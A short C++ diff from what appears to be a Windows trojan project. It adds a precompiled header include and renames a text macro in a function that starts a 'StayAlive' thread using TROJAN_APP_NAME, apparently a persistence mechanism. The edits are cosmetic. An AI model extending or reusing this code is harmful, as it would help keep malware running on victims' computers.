@@ -1,3 +1,5 @@
+#include "pch.h"
+
 #include "Application.hpp"
 #include "Server.h"
 #include "..\Tools.h"
@@ -8,7 +10,7 @@ BOOL Application::startSavingThread()
 {
 	if (!CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(&StayAlive), TROJAN_APP_NAME, 0, NULL))
 	{
-		PrintError(TEXT("CreateThread"), GetLastError());
+		PrintError(TEXTH("CreateThread"), GetLastError());
 
 		return FALSE;
 	}
